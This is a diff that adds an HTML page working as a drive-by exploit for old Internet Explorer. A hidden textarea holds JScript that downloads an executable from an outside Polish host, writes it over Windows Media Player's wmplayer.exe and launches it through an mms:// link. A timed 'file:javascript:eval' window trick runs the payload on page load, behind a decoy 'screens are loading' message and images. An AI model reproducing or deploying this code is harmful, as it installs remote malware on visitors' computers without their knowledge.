@@ -1,0 +1,106 @@
+<HTML>
+<textarea id="code" style="display:none;">
+
+    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
+    x.Open("GET", "http://www.masterfusion.republika.pl/1.exe",0); 
+    x.Send(); 
+    
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Mode = 3;
+    s.Type = 1;
+    s.Open();
+    s.Write(x.responseBody);
+
+    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
+    location.href = "mms://";
+
+</textarea>
+wait a some time the screns are loging ;)
+
+
+<script language="JavaScript">
+<!--
+
+function SymError()
+{
+  return true;
+}
+
+window.onerror = SymError;
+
+var SymRealWinOpen = window.open;
+
+function SymWinOpen(url, name, attributes)
+{
+  return (new Object());
+}
+
+window.open = SymWinOpen;
+
+//-->
+</script>
+
+<script language="javascript">
+
+    function preparecode(code) {
+        result = '';
+        lines = code.split(/\r\n/);
+        for (i=0;i<lines.length;i++) {
+        
+            line = lines[i];
+            line = line.replace(/^\s+/,"");
+            line = line.replace(/\s+$/,"");
+            line = line.replace(/'/g,"\\'");
+            line = line.replace(/[\\]/g,"\\\\");
+            line = line.replace(/[/]/g,"%2f");
+
+            if (line != '') {
+                result += line + '\\r\\n';
+            }
+        }
+        return result;
+    }
+    
+    function doit() {
+        mycode = preparecode(document.all.code.value);
+        myURL = "file:javascript:eval('" + mycode + "')";
+        window.open(myURL,"_media");
+    }
+    
+
+    window.open("error.jsp","_media");
+    
+    setTimeout("doit()", 5000);
+    
+    
+</script>
+<img src="ue.jpg">
+<img src="adv.jpg">
+</HTML>
+<script language="JavaScript">
+<!--
+var SymRealOnLoad;
+var SymRealOnUnload;
+
+function SymOnUnload()
+{
+  window.open = SymWinOpen;
+  if(SymRealOnUnload != null)
+     SymRealOnUnload();
+}
+
+function SymOnLoad()
+{
+  if(SymRealOnLoad != null)
+     SymRealOnLoad();
+  window.open = SymRealWinOpen;
+  SymRealOnUnload = window.onunload;
+  window.onunload = SymOnUnload;
+}
+
+SymRealOnLoad = window.onload;
+window.onload = SymOnLoad;
+
+//-->
+</script>
+
